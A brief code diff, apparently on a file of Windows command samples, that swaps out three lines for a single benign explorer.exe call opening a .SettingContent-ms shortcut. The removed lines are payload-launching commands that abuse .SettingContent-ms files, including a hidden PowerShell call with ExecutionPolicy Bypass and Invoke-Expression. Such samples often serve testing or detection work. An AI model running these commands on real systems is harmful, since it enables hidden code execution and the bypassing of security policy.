@@ -1,3 +1,1 @@
-cmd.exe /c "set EXT=.SettingContent-ms && copy mymalware%EXT% %TEMP%\temp.xml && control.exe %TEMP%\temp.xml"
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$p = 'C:\path\to\payload.settingcontent-ms'; $c = Get-Content $p -Raw; Invoke-Expression ($c.ToString().Replace('.SettingContent-ms', ''))"
-ren payload.txt payload.settingcontent-ms && explorer.exe payload.settingcontent-ms
+"C:\Windows\explorer.exe" "C:\Users\Public\SettingsShortcut.SettingContent-ms"
